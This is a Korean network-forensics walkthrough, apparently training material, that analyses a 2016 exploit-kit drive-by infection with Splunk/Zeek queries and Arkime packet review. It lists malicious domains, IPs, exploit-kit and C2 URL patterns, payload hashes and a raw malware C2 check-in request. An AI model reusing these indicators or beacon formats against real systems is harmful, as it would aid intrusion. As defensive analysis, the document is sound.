### C8단계 — 서버별 HTTP 요약 { #http-summary }

```spl
index=zeek sourcetype=zeek:http
| stats count min(ts) as first sum(response_body_len) as bytes values(method) as method values(status_code) as status values(resp_mime_types) as mime values(user_agent) as ua by id_resp_h host
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

- `sum(response_body_len) as bytes` — 서버가 돌려준 내용 크기 합계(실제 파일 크기에 가까움).
- `values(method)` — GET(받기) / POST(보내기).
- `values(status_code)` — 200 성공, 404 없음, 302 이동, 408 시간 초과 …
- `values(resp_mime_types)` — Zeek가 **내용을 보고 판단한** 종류(위조하기 어려움).
- `values(user_agent)` — 요청한 프로그램.

**실제 결과 (21줄 중 핵심):**

| id_resp_h | count | first | bytes | method | status | mime | ua |
|---|---|---|---|---|---|---|---|
| 173.223.52.193 | 1 | 21:24:12 | 14 | GET | 200 | text/plain | **Microsoft NCSI** |
| 148.251.255.26 | 36 | 21:27:15 | 527,492 | GET | 200 | 이미지, html | IE11 |
| 213.174.33.141 | 88 | 21:28:17 | 1,663,151 | GET | 200 | font-woff, 이미지, html | IE11 |
| **85.93.0.32** | 2 | 21:28:24 | 2,447 | GET | 200 | **x-shockwave-flash**, text/html | IE11 |
| **86.106.93.167** | 5 | 21:28:26 | 499,066 | GET, **POST** | 200, 404 | **-**, **x-shockwave-flash**, text/html | IE11 **+ 다른 IE11 문자열** |
| **184.28.188.184** | 1 | 21:28:27 | 349 | GET | 404 | text/html | **Shockwave Flash** |
| **128.183.114.107** | 1 | 21:28:39 | 4,491 | GET | 200 | text/plain | **Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)** |
| **185.86.77.12** | 4 | 21:28:41 | **0** | GET, **POST** | 200 | - | **MSIE 8.0** |
| **192.210.137.123** | 6 | 21:31:03 | 230,507 | GET, **POST** | 200 | **-** | IE11 |
| 80.247.235.238 | 30 | 21:32:20 | 431,328 | GET | 200, 404 | 이미지, html | IE11 |
| 185.21.102.206 | 57 | 21:35:06 | 2,845,667 | GET | 200 | 글꼴, 이미지, html | IE11 |

!!! warning "함정: 모든 줄의 `host`가 `workstation`"
    Zeek의 `host` 필드(방문한 사이트 이름)가 Splunk 기본 `host` 필드(로그를 보낸 기계 이름)와 이름이 겹쳐서 Splunk 값이 이겼습니다. 사이트 이름은 다른 방법으로 얻으세요: `referrer` 필드, DNS(`zeek:dns`), 또는 Arkime. (`spath`는 안 됐습니다 — 이 Zeek 로그는 JSON이 아니라 **TSV**입니다.)

**User-Agent 읽기:**

| UA | 뜻 |
|---|---|
| `Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko` | **윈도우 7 + 인터넷 익스플로러 11** — 사용자의 브라우저 |
| `Microsoft NCSI` | 윈도우가 "인터넷 연결됐나?" 확인 — 정상, PC가 막 네트워크에 붙음(DHCP와 일치) |
| **`Shockwave Flash`** | **Flash 플레이어 자신**이 요청 — Flash 파일이 실행됐음 |
| **`Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)`** | **IE11** PC에서 **IE8**이라고 주장 → **IE인 척하는 브라우저 아닌 프로그램**. 악성코드에서 흔함 |

**MIME 읽기:** Flash 파일 두 개, 그리고 수백 KB짜리 `-`(Zeek가 종류를 모름). 정상 파일은 Zeek가 알아보는 매직 바이트(`PK`, `MZ`, `%PDF` 등)로 시작합니다. **암호화된** 데이터는 무작위 바이트로 시작합니다 — 암호화된 악성 페이로드의 전형적인 모습입니다.

### C9단계 — 파일 종류 (Zeek files.log) { #files }

```spl
index=zeek sourcetype=zeek:files
| stats count sum(seen_bytes) as bytes by mime_type
| sort - count
```

- `mime_type` — 파일 앞 바이트로 판단한 진짜 종류(메일에서 base64 매직 바이트를 읽은 것과 같은 원리).
- `seen_bytes` — Zeek가 실제로 본 크기.

**실제 결과:**

| mime_type | count | bytes |
|---|---|---|
| image/jpeg | 91 | 2,560,922 |
| image/png | 64 | 676,249 |
| text/plain | 37 | 2,240,106 |
| image/gif | 22 | 11,008 |
| text/html | 11 | 416,827 |
| application/javascript | 5 | 679,778 |
| **application/vnd.ms-cab-compressed** | **4** | **10,036** |
| **-** | **3** | **593,407** |
| image/x-icon | 3 | 3,706 |
| application/vnd.ms-fontobject | 2 | 42,717 |
| **application/x-shockwave-flash** | **2** | **40,540** |
| application/font-woff | 1 | 23,892 |

`application/x-dosexec`가 없습니다 — **윈도우 실행파일이 평문으로 내려온 적은 없습니다.**

!!! note "정정 — CAB 파일 네 개"
    처음에는 `vnd.ms-cab-compressed` 네 개를 윈도우가 인증서 신뢰 목록을 받는 정상 CAB 다운로드로 봤습니다. 나중에 Arkime에서 이 넷이 **악성코드가 C2로 올려 보낸 CAB 파일**임을 확인했습니다([E6](#c2-upload)). **받은 게 아니라 보낸** 파일입니다.

### C10단계 — 메일이 이 트래픽을 설명하나? { #email-check }

**목적:** 뻔한 가설(메일 2나 메일 6을 열었다)을 받아들이기 전에 시험하기.

```spl
index=zeek ("cehost" OR "love2date" OR "hoast" OR "mac7" OR "t1host" OR "faucibus" OR "odioauctor")
| table _raw
```

- sourcetype을 안 걸었으니 **모든 Zeek 로그**(conn, dns, http, ssl …)의 원본 글자에서 찾습니다.
- `_raw` — 원본 로그 한 줄 전체.

**실제 결과:** `No results found.`

**결과 읽기:**

- 이 시간에 메일 2의 HTML을 열었다면 `www.cehost[.]ro`(DNS/SNI)가 나와야 합니다. 없습니다.
- 첨부 `.js`가 실행됐다면, 메일 시각 직후 스크립트 UA나 UA 없는 **exe 다운로드**가 있어야 합니다. `x-dosexec`가 없고, 캡처는 메일보다 3~12시간 뒤이고, 대신 **Flash와 정체불명 파일**이 있습니다.

!!! question "질문: 그럼 이 트래픽은 메일들과 아무 상관이 없나요?"
    **이 캡처 안에서는 없습니다.** 다만 무엇이 증명됐는지 정확히 말해야 합니다.

    - 증명된 것: 이 감염은 **웹사이트 방문**에서 시작됐고, 이 12분 안에 **메일 관련 활동은 보이지 않는다.**
    - 증명되지 않은 것: Dekker가 첨부를 한 번도 안 열었다는 것. 캡처는 12분이고, 메일 2는 12시간 전, 메일 6은 3시간 전에 왔습니다. 그 사이는 이 증거 밖입니다. "일어나지 않았다"가 아니라 "**이 캡처에서는 관찰되지 않았다**"라고 쓰세요.
    - Dekker가 같은 날 피싱 메일 2통을 받고 웹으로도 감염된 건 우연일 수도 있고, 재무이사가 여러 경로로 노려졌다는 신호일 수도 있습니다. 그래서 메일은 받는 사람 5명 모두에 대한 **별도 단서**가 됩니다.

    시나리오에 메일이 있었던 이유: (1) **선입견 시험** — "피싱을 받았으니 피싱 때문이겠지", (2) 직원 목록과 함께 `Dekker-PC`를 **재무이사**로 연결해 심각도를 높여 줌, (3) **다른 PC들에 대한 실제 위협**. **관련 있어 보이는 것(상관)과 실제 원인(인과)은 다릅니다. 가설은 세우되, 결론은 증거가 내리게 하세요.**

```text
[261118 2126, Analyst] Comparing capture with Dekker emails (Email 2 09:34Z, Email 6 18:23Z) - Not Found: no email IOC strings in any Zeek log; no exe/attachment download pattern
[261118 2127, Analyst] Reviewing HTTP user agents and file types - Found: "Shockwave Flash" UA, non-browser "MSIE 8.0" UA, 2x Flash, 3x unknown mime (encrypted) files
```

### C11단계 — referrer 사슬 따라가기 { #referrer-chain }

`referrer` = "브라우저가 이 요청을 하게 만든 페이지". 거꾸로 따라가면 사용자가 어디서 출발해 어디로 끌려갔는지 보입니다.

```spl
index=zeek sourcetype=zeek:http id_resp_h IN (85.93.0.32, 86.106.93.167, 184.28.188.184, 128.183.114.107, 185.86.77.12, 192.210.137.123)
| eval t=strftime(ts, "%H:%M:%S")
| table t id_resp_h method uri referrer status_code resp_mime_types request_body_len response_body_len user_agent
| sort t
```

- `request_body_len` — PC가 **올려 보낸** 크기(POST 내용), `response_body_len` — 서버가 돌려준 크기.

**실제 결과 (19줄 중 핵심):**

| t | id_resp_h | method | uri | referrer |
|---|---|---|---|---|
| 21:28:24 | 85.93.0.32 | GET | `/shop.php?sid=4046AAB187AB2C1563B214BE7AC6702950B304E2E9E1696E18244B8501B268FD92DA0D313D2273E24C283B` | `http://www.source-werbeartikel.com/` |
| 21:28:25 | 85.93.0.32 | GET | `/hot.php?id=4046AAB187AB…283B` (같은 값) | `http://www.source-werbeartikel.com/` |
| 21:28:26 | 86.106.93.167 | GET | `/civis/index.php?PHPSESSID=3.b7&action=714324p02212u2q4548f8` | `http://lsbery.tk/hot.php?id=4046AAB…` |
| 21:28:27 | 184.28.188.184 | GET | `/get/flashplayer/update/current/install/version.xml15.0.0.189~installVector=1&lang=en&cpuWordLength=32&playerType=ax&os=win&osVer=13` | - |
| 21:28:29 | 86.106.93.167 | GET ×2 | `/charge.zhtml?dead=sVShjH&society=KgXs1bcH&level=O29Gm9T3&go=VdL&once=XN3S3cuYQ&way=Z41t&nothing=sTJVXv7X&art=Jw` | `http://bsbkxs.zdxwx3m.pw/civis/index.php?PHPSESS…` |
| 21:28:29 | 86.106.93.167 | POST | `/civis/so.cpg?directly=-pf&commission=&important=n0IP&color=xMZn&and=&analysis=doL0EY&hundred=nJBKRWWP4&name=Xe5tZx&any=bMXK&certain=aWh-AJtz7&rather=PEd` | 랜딩 페이지 |
| 21:28:32 | 86.106.93.167 | GET | `/today.jst?technical=_MNsOrB&captain=&something=gxPx-&own=&themselves=T_wh7g5&eye=l3_LBg&citizen=zdelxIDGFLQvZFA8KbsEuiX` | `http://lsbery.tk/hot.php?id=…` |
| 21:28:39 | 128.183.114.107 | GET | `/planetary/text/nasa_pr_20001220.txt` | - |
| 21:28:41 | 185.86.77.12 | GET | `/images/INKuKE6Kg4Dzd25MNG/AX7HTCjk9/Km4MvXqg_2BRotklsjoc/…/Gi905Y3Ja/4.gif` | - |
| 21:28:52 | 185.86.77.12 | POST | `/images/78F8mFk5QY/l0D9o4Pskv0nsdTeJ/c1L_2F8SJVz_/…/CTU.bmp` | - |
| 21:30:43 | 185.86.77.12 | GET | `/images/N6bsv2yg/…/3.gif` | - |
| 21:30:54 | 185.86.77.12 | POST | `/images/yGOF1OPRgpsNLYRRXk/…/uD27YPGr.bmp` | - |
| 21:31:03 | 192.210.137.123 | GET | `/images/lYPocsAb06v/…/i.jpeg` | - |
| 21:32:39 | 192.210.137.123 | GET | `/images/_2BL34iAt/…/i.gif` | - |
| 21:33:03 | 192.210.137.123 | GET | `/images/tflgmImOzp/…/lron1.jpeg` | - |
| 21:33:16 | 192.210.137.123 | POST | `/images/u0oFNKi5H86jc9OSaYE4/…/qS.bmp` | - |
| 21:35:00 | 192.210.137.123 | GET | `/images/SIMu3u0tCE_/…/B9F.jpeg` | - |
| 21:35:15 | 192.210.137.123 | POST | `/images/tLL_2FR9qqixlfXoDE/…/Pspw_2F.bmp` | - |

**결과 읽기 — 신호 하나씩:**

- **게이트의 같은 ID.** `/shop.php?sid=`와 `/hot.php?id=`에 같은 86자 16진수 값이 있습니다 — 방문자 한 명을 추적하는 값입니다. 사이트에 심어진 코드가 방문자를 게이트로 보내고, 게이트가 킷으로 넘겼습니다.
- **이상한 도메인.** `lsbery[.]tk`, `bsbkxs.zdxwx3m[.]pw` — 싸거나 무료인 최상위 도메인(`.tk`, `.pw`)에 무작위 글자. 악성 인프라에 흔합니다.
- **파라미터 이름이 무작위 영어 단어**(`dead`, `society`, `level`, `technical`, `captain` …) — 2016년 초 **Angler EK**의 특징으로 널리 알려졌고, `/civis/index.php?PHPSESSID=…&action=…` 같은 랜딩 주소도 그렇습니다. 가능할 때 OSINT로 확인하세요.
- **거짓 확장자.** `.zhtml`, `.jst`, `.cpg` — 실제 내용은 Flash이거나 정체불명.
- **오래된 Flash.** `version.xml15.0.0.189` — Flash 15는 2014년 말 버전이고, 2016년 2월엔 공개된 익스플로잇이 많았습니다.
- **C2 URL 모양.** `/images/<긴 무작위 조각들>/<짧은 이름>.gif|jpeg|bmp`. `_2F`, `_2B`는 `/`, `+`를 바꿔 쓴 것 — **경로에 base64 데이터를 숨겼습니다.** 그림 요청처럼 보이지만 응답은 그림이 아닙니다. GET은 `.gif`/`.jpeg`, POST는 `.bmp` — 정상 웹서핑에서는 나오지 않는 일정한 규칙입니다. 이런 URL 모양은 **Ursnif(Gozi-ISFB)**의 특징으로 널리 알려져 있습니다.
- **주기적.** 192.210.137.123으로 1~2분마다 — 비콘입니다.

```text
[261118 2132, Analyst] Following HTTP referrer chain - Found: www.source-werbeartikel.com -> lsbery.tk (85.93.0.32) -> bsbkxs.zdxwx3m.pw (86.106.93.167)
[261118 2133, Analyst] Identifying exploit delivery - Found: Flash exploit /charge.zhtml and encrypted payload /today.jst from 86.106.93.167; client Flash 15.0.0.189 (outdated)
[261118 2134, Analyst] Identifying post-infection traffic - Found: non-browser UA "MSIE 8.0" to 128.183.114.107 and 185.86.77.12; /images/<base64>/*.gif|bmp|jpeg C2 pattern to 185.86.77.12 and 192.210.137.123
```

### C12단계 — Flash와 정체불명 파일 { #files-detail }

```spl
index=zeek sourcetype=zeek:files mime_type IN ("-", "application/x-shockwave-flash")
| eval t=strftime(ts, "%H:%M:%S")
| table t tx_hosts rx_hosts id_orig_h id_resp_h source mime_type seen_bytes total_bytes md5 sha1
| sort t
```

- `tx_hosts` / `rx_hosts` — 파일을 보낸 쪽 / 받은 쪽(새 Zeek는 `id_orig_h`/`id_resp_h`를 씀 — 둘 다 넣었으니 있는 쪽에 값이 나옴).
- `seen_bytes` = `total_bytes` → 파일을 끝까지 다 봄.
- `md5`, `sha1` — 해시(Zeek가 계산하도록 설정돼 있을 때).

**실제 결과:**

| t | tx_hosts | rx_hosts | mime_type | seen_bytes |
|---|---|---|---|---|
| 21:28:24 | 85.93.0.32 | 10.41.245.114 | application/x-shockwave-flash | 1,983 |
| 21:28:29 | 86.106.93.167 | 10.41.245.114 | - | 2,432 |
| 21:28:30 | 86.106.93.167 | 10.41.245.114 | application/x-shockwave-flash | 38,557 |
| 21:28:33 | 86.106.93.167 | 10.41.245.114 | **-** | **360,468** |
| 21:31:04 | 192.210.137.123 | 10.41.245.114 | **-** | **230,507** |

`md5`/`sha1`이 `-` — **이 Zeek는 파일 해시를 계산하지 않습니다.** MD5는 Arkime에서 얻습니다([E8](#hashes)).

### C13단계 — IP와 도메인 이름 맞추기 (DNS) { #dns }

```spl
index=zeek sourcetype=zeek:dns
| search query IN ("*werbeartikel*", "*lsbery*", "*zdxwx3m*") OR answers IN ("85.93.0.32", "86.106.93.167", "185.86.77.12", "192.210.137.123", "128.183.114.107")
| eval t=strftime(ts, "%H:%M:%S")
| table t query answers
| sort t
```

- `search`로 다시 거릅니다: 이름에 이 글자가 들어 있거나, **또는** DNS 응답이 의심 IP인 것.

**실제 결과:**

| t | query | answers |
|---|---|---|
| 21:28:15 | www.source-werbeartikel.com | 213.174.33.141 |
| 21:28:16 | www.source-werbeartikel.com | 213.174.33.141 |
| 21:28:23 | lsbery.tk | 85.93.0.32 |
| 21:28:25 | bsbkxs.zdxwx3m.pw | 86.106.93.167 |
| 21:28:39 | nssdc.gsfc.nasa.gov | 128.183.114.107 |

**결과 읽기:** 해킹된 사이트는 **213.174.33.141**입니다(148.251.255.26은 21:27:15에 먼저 방문한 다른 사이트). `nssdc.gsfc.nasa[.]gov`는 정상 NASA 사이트이고, 악성코드가 **인터넷 연결을 확인**하려고 텍스트 파일을 받은 것입니다 — 차단할 IOC가 아니라 행동 지표입니다. C2 IP 두 개는 안 나왔는데… 아래 정정을 보세요.

### C14단계 — C2 도메인은 DNS 질의가 *있었습니다* { #dns-correction }

뒤에 Arkime에서 두 C2 IP 모두 Host 헤더가 `tplandthepropforcontent[.]com`임을 봤습니다([E3](#arkime-gate)). 그 이름으로 직접 찾으면:

```spl
index=zeek sourcetype=zeek:dns query="*tplandthe*"
```

**실제 결과 (2건, TSV 원본):**

```text
1454707720.899691  CvTG1D2bMwxcqkxT0g  10.41.245.114  56313  10.2.41.7  53  udp  44886  0.399232  tplandthepropforcontent.com  1  C_INTERNET  1  A  0  NOERROR  F  F  T  T  0  185.86.77.12,192.210.137.123  59.000000,59.000000  F
1454707862.298827  CNTOOz3i9s4JTqCth5  10.41.245.114  56397  10.2.41.7  53  udp  49787  0.114467  tplandthepropforcontent.com  1  C_INTERNET  1  A  0  NOERROR  F  F  T  T  0  192.210.137.123,185.86.77.12  43.000000,43.000000  F
```

Zeek `dns.log` 한 줄 읽는 법:

| 값 | 필드 |
|---|---|
| `1454707720.899691` | ts (epoch) |
| `CvTG1D2bMwxcqkxT0g` | uid |
| `10.41.245.114` / `56313` | 질의한 PC / 포트 |
| `10.2.41.7` / `53` | DNS 서버 / 포트 |
| `udp` | 프로토콜 |
| `tplandthepropforcontent.com` | **질의한 이름** |
| `A` | 질의 종류(IPv4 주소) |
| `NOERROR` | 성공 |
| `185.86.77.12,192.210.137.123` | **응답** |
| `59.000000,…` | TTL(응답을 캐시해 둘 초) |

ts 바꾸기: 1454707720 − 1454630400(2016-02-05 00:00 UTC) = 77,320초 = **21:28:40.9**, 두 번째는 **21:31:02.3**.

| DNS 시각 | 응답 순서 | 다음 연결 |
|---|---|---|
| 21:28:40.9 | 185.86.77.12, 192.210.137.123 | 21:28:41 → **185.86.77.12** |
| 21:31:02.3 | 192.210.137.123, 185.86.77.12 | 21:31:03 → **192.210.137.123** |

!!! note "정정 — 앞의 쿼리가 'C2 IP는 DNS 질의 없음'이라고 한 이유"
    이 로그는 **TSV**입니다. 값이 여러 개인 필드(`answers` 같은)는 **쉼표로 이어 붙인 글자 하나**로 저장됩니다: `185.86.77.12,192.210.137.123`. `answers IN ("185.86.77.12", …)`는 **정확히 같은** 값만 찾으니 놓쳤습니다. 이런 필드는 와일드카드를 쓰세요.

    ```spl
    index=zeek sourcetype=zeek:dns answers="*185.86.77.12*"
    ```

    교훈: "Not Found"라고 쓰기 전에, 쿼리가 데이터 형식과 정말 맞을 수 있었는지 확인하세요. 티켓에는 **정정 줄을 추가**하고 틀린 줄은 지우지 마세요. 다른 사람이 생각의 흐름을 따라가야 합니다.

!!! note "정정 — '1차·2차 C2'가 아니라 라운드 로빈 DNS"
    도메인 하나가 IP 두 개를 갖고, DNS 서버가 응답할 때마다 **순서를 바꿔** 줍니다. PC는 매번 첫 번째 IP로 갔습니다. TTL이 짧아서(59초, 43초) 운영자가 IP를 빨리 바꿀 수 있습니다 — 악성 인프라에서 흔합니다. **도메인과 IP 두 개 모두** 차단하세요.

```text
[261118 2140, Analyst] Resolving domains for suspicious IPs via zeek:dns - Found: www.source-werbeartikel.com=213.174.33.141, lsbery.tk=85.93.0.32, bsbkxs.zdxwx3m.pw=86.106.93.167, nssdc.gsfc.nasa.gov=128.183.114.107
[261118 2205, Analyst] CORRECTION: C2 domain tplandthepropforcontent.com WAS resolved via 10.2.41.7 at 21:28:40Z (answers 185.86.77.12,192.210.137.123, TTL 59) and 21:31:02Z (answers reversed, TTL 43) - round-robin DNS; earlier "no DNS" result was a query error (TSV comma-joined answers field)
```

---

## D부 — 익스플로잇 킷이란? { #what-is-ek }

**익스플로잇 킷(EK)**은 **웹페이지를 열기만 해도 감염시키는** 자동화된 공격 서버 패키지입니다. 클릭이나 다운로드가 필요 없습니다. 브라우저나 플러그인(Flash, Java, Silverlight 등)의 취약점을 이용합니다. 이런 감염을 **드라이브 바이 다운로드**라고 합니다.

*비유:* 정비소에 차를 맡겼는데, 정비사가 몰래 문 잠금장치 모델을 보고 맞는 만능 열쇠를 골라 차에 추적기를 숨겨 둡니다. 차 주인은 아무것도 모릅니다.

| 단계 | 하는 일 | 이번 사례 |
|---|---|---|
| 1. 입구 | 사용자가 **해킹된 정상 사이트**나 악성 광고가 있는 페이지를 방문 | `www.source-werbeartikel[.]com`(독일 판촉물 쇼핑몰, Magento 1 구조 `/skin/frontend/…`, `/media/…`) — 21:28:17 |
| 2. 게이트 | 심어진 코드가 방문자를 걸러서 몰래 EK로 넘김(분석가나 보안 장비는 건너뛰기도 함) | `lsbery[.]tk`(85.93.0.32) — Flash 게이트 `/shop.php`, 이동 `/hot.php` — 21:28:24 |
| 3. 랜딩 페이지 | 브라우저, OS, 플러그인 버전을 조사해서 **쓸 익스플로잇을 고름** | `bsbkxs.zdxwx3m[.]pw/civis/index.php`(약 100KB, 난독화) — 21:28:26 |
| 4. 익스플로잇 | 익스플로잇 파일을 보냄. 당시엔 Flash가 가장 흔한 표적 | `/charge.zhtml` → Flash 38,557바이트, PC의 Flash 15.0.0.189 — 21:28:29 |
| 5. 페이로드 | 성공하면 **암호화된** 페이로드를 받아 메모리에서 풀어 실행. 보안 장비가 파일 종류를 모름 | `/today.jst` → 360,468바이트, Zeek mime `-` — 21:28:32 |
| 6. 감염 후 | 설치된 악성코드가 C2에 접속 | 21:28:39 연결 확인 → 21:28:40 C2 DNS → 21:28:41 C2 |

1~6단계가 **약 25초**였습니다. 사용자는 판촉물 쇼핑몰을 구경했을 뿐입니다.

**EK 트래픽 알아보기:** 이상한 URL(`.tk`/`.pw`의 무작위 도메인, 의미 없는 영어 단어 파라미터, 가짜 확장자), **매우 빠름**(게이트부터 페이로드까지 몇 초), 페이로드가 **암호화됨**(종류 모름, 수백 KB), 직후 **브라우저 아닌 UA** 등장, **referrer가 사슬처럼** 사이트 → 게이트 → EK로 이어짐.

**역사:** 2014~2016년이 EK의 전성기였습니다. Angler, Neutrino, Nuclear, RIG, Magnitude가 랜섬웨어와 금융 트로이목마를 퍼뜨렸습니다. Angler는 2016년 6월쯤 사라졌습니다. Flash 지원이 끝나고(2020년 말) 브라우저가 강해지면서 EK는 드물어졌습니다. 요즘은 같은 "사이트 → 게이트" 구조를 **가짜 브라우저 업데이트 화면**과 함께 써서 사용자가 직접 파일을 실행하게 만드는 경우가 더 흔합니다. 분석 방법 — referrer 사슬, 이상한 URL, 암호화된 페이로드, 감염 후 C2 — 은 같습니다.

더 알아보기: [익스플로잇 킷 알아보기](../../training/blue-team-essentials/http-analysis/exploit-kits-practice.md).

---

## E부 — Arkime (패킷 수준 확인) { #arkime }

Splunk/Zeek는 **요약**이고, Arkime는 **실제 패킷**입니다. 티켓의 증거는 패킷 수준에서 확인하고 저장해야 합니다. (브라우저에서 Arkime 탭 제목은 **SPIView**입니다.)

### E1단계 — 시간 범위와 감염 사슬 쿼리 { #arkime-chain }

시간 범위는 **All**(또는 Custom 2016/02/05 21:24:05 – 21:36:43)로 두세요. PC IP로 거르니 시간대는 상관없습니다. 가능하면 **Settings → General → Timezone Format → UTC**로 바꾸세요.

```text
ip == 10.41.245.114 && ip.dst == [213.174.33.141, 85.93.0.32, 86.106.93.167, 185.86.77.12, 192.210.137.123]
```

- `ip == 10.41.245.114` — 우리 PC가 출발지 **또는** 도착지인 세션.
- `&&` — 그리고.
- `ip.dst == [ … ]` — 도착 IP가 대괄호 목록 중 하나(Arkime 목록 문법).

**실제 결과:** `Showing 1 - 21 of 21 entries`, 2016/02/05 21:28:17 – 21:36:39 UTC. 열: Start/Stop Time, Src IP/Port, Dst IP/Port, Packets, Databytes/Bytes, Arkime Node, Info(프로토콜 + URI). Info 열에 벌써 `lsbery.tk/shop.php?sid=…`, `bsbkxs.zdxwx3m.pw/today.jst?…`, `tplandthepropforcontent.com/images/…`가 보입니다.

### E2단계 — C2 쪽의 HTTP 없는 짝 세션 { #idle-sessions }

C2 HTTP 세션마다 옆에 **tcp만 있는** 세션이 하나씩 짝으로 있습니다. **패킷 7개, PC가 보낸 데이터 0바이트, 서버가 보낸 데이터 420바이트**입니다(출발 포트 49304, 49318, 49331, 49381).

**결과 읽기:** PC는 요청을 한 번도 안 보냈고, 서버가 약 420바이트를 보내고 연결을 닫았습니다. PC가 **연결을 미리 하나 더 열어 두었고**, 서버가 시간 초과로 닫은 것(예: HTTP `408 Request Timeout`)과 맞습니다. 하나를 열어(natural 보기) 420바이트가 무엇인지 확인하세요. 나중에 Snort가 이 네 연결에서 **HTTP 요청이 한 번도 없었음**을 확인해 줍니다([F5](#snort-results)).

### E3단계 — 게이트 세션 { #arkime-gate }

```text
ip == 85.93.0.32
```

세션의 `+`를 누르면 **General**(왼쪽)과 **HTTP**(오른쪽)가 열립니다.

**`/shop.php` (출발 포트 49257):**

| 필드 | 값 | 읽기 |
|---|---|---|
| Time | 2016/02/05 21:28:24 – 21:28:25 UTC | |
| Src Ethernet | `00:17:31:7d:52:ba` OUI **ASUSTek** | Dekker-PC의 랜카드(DHCP와 일치) |
| Dst Ethernet | `88:43:e1:6c:b4:5a` OUI **Cisco** | 회사 게이트웨이 라우터 |
| Dst IP/Port | 85.93.0.32 : 80 { RIPE } | 유럽 할당 대역 |
| Hosts | `lsbery.tk` | |
| User Agents | IE11 | |
| Request Headers | accept, accept-encoding, accept-language, connection, host, referer, user-agent, **x-flash-version** | |
| referer Header | `http://www.source-werbeartikel.com/` | |
| content-type Header | `application/x-shockwave-flash` | |
| server Header | `Apache/2.2.15 (CentOS)` | 공격자 서버의 특징 |
| **Body MD5s** | **`5e251668b8a3e02e9da376d6f7da8229`** | 응답 내용(게이트 Flash)의 해시 |
| QS Keys | `sid` | |

**`/hot.php` (49258):** 같은 referer, 응답 `text/html; charset=UTF-8`, `x-flash-version` 없음.

**결과 읽기:** IE는 **Flash 플레이어 안에서 나간 요청**에 **`x-flash-version`**을 붙입니다. 그러니: 쇼핑몰에 심어진 코드가 게이트의 **Flash 파일**(`shop.php`)을 불러왔고, 그 Flash가 `hot.php`를 열었고, `hot.php`가 킷으로 넘겼습니다. **Flash 게이트** — 2016년 초 **EITest** 캠페인의 특징으로 널리 알려져 있습니다(OSINT로 확인).

**OUI:** MAC 앞 6자리는 제조사를 알려 줍니다. 호스트 오퍼레이터가 실제 장비를 찾을 때 유용합니다.

```text
[261118 2204, Analyst] Reviewing gate lsbery.tk sessions - Found: /shop.php returned Flash (x-flash-version request header, Body MD5 5e251668b8a3e02e9da376d6f7da8229), /hot.php returned HTML redirect; server Apache/2.2.15 (CentOS)
```

### E4단계 — 익스플로잇 킷 세션 { #arkime-ek }

```text
ip == 86.106.93.167
```

**랜딩 + POST (49279, 21:28:25 – 21:29:37):** GET (1) + POST (1), 상태 200, Host `bsbkxs.zdxwx3m.pw`, IE11, referer = 랜딩 페이지와 `lsbery.tk/hot.php?id=…`, content-type `text/html`, 서버 **nginx/1.2.1**, Dst databytes 100,536, Body MD5s `49143103a3e0a8e6fb35d02c61aa710e`, `f51880eb438f66a8de9fd674e1a036fb`, `27776220a96b24954d66fb137f4ff01a`, QS Keys `PHPSESSID commission name action color hundred certain important any directly analysis and rather`.

- 약 100KB 랜딩 페이지: 조사 코드를 **심하게 난독화**해서 큽니다.

**Flash 익스플로잇 (49278, 21:28:25 – 21:29:37):** **GET (2)**, 상태 **200과 404**, 요청 헤더 **x-flash-version**, referer = 랜딩 페이지, content-type `application/x-shockwave-flash` + `text/html`, nginx/1.2.1, **Body MD5 `cf90ba155fda322eeadd2fdeb4368849`**, libfile content type `application/x-shockwave-flash`, QS Keys `dead once nothing way society level art go`.

- 같은 URL을 두 번 요청: 첫 번째는 익스플로잇(200), 두 번째는 **404**. EK는 분석가가 다시 받지 못하게 익스플로잇을 **방문자당 한 번만** 주는 경우가 많습니다.
- `libfile content type` = Arkime 자체 내용 검사(Zeek mime과 같은 역할) — Flash로 일치합니다.

**페이로드 (49284, 21:28:32 – 21:29:37):** GET (1), 200, `application/octet-stream`, nginx/1.2.1, Dst databytes 360,732, **Body MD5 `4466cd2032944d03ffe9d4d7d74083c2`**, QS Keys `themselves own citizen technical eye captain something`.

- **User-Agent가 다름:** `Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; rv:11.0) like Gecko` — 다른 코드 경로(익스플로잇이 실행한 코드로 보임)에서 나간 요청입니다.
- referer가 랜딩 페이지가 아니라 **게이트**(`lsbery.tk/hot.php`)입니다.

**DNS 세션 (21:28:25):** `10.41.245.114:49890 → 10.2.41.7:53`, Query A `bsbkxs.zdxwx3m.pw` → 86.106.93.167, NOERROR, 플래그 RD RA.

```text
[261118 2210, Analyst] Reviewing EK sessions on 86.106.93.167 (nginx/1.2.1) - Found: landing /civis/index.php (~100KB), Flash exploit /charge.zhtml served once (2nd request 404, MD5 cf90ba155fda322eeadd2fdeb4368849), payload /today.jst application/octet-stream 360,732 bytes (MD5 4466cd2032944d03ffe9d4d7d74083c2)
```

### E5단계 — C2: natural 보기로 체크인 읽기 { #arkime-c2 }

```text
ip == 185.86.77.12
```

세션 4개: 21:28:40, 21:31:02의 DNS(`tplandthepropforcontent.com`), HTTP 49296(21:28:41 – 21:30:39)과 49297(21:30:43 – 21:32:28), 각각 GET 하나와 POST 하나.

49297을 열고 패킷 보기를 **natural**로 바꾸세요(패킷 위 버튼: 패킷 수, natural/ascii/hex, Src/Dst, UnXOR, Unbase64).

```text
GET /images/N6bsv2yg/nfRgMYDABPReeAWPINrTWFk/poF_2BnOQ_/2BzZdMiGngbMC_2Bj/LwXI5n7HJmpw/UMW04zx41qk/_2B8jTW4BGt8uc/lkpkQfGDZPqz2O1MOE4Pa/h6JH8GwlbikbY0dh/0z8VQjCJgAu_2BZ/QPYTXoSJXUZ9/3.gif HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: tplandthepropforcontent.com
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 05 Feb 2016 21:30:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
```

**결과 읽기:**

- `.gif`를 달라고 했는데 **0바이트**를 받았습니다. 그림 요청이 아니라 **체크인**입니다. 빈 응답은 보통 "지금은 시킬 일 없음"입니다.
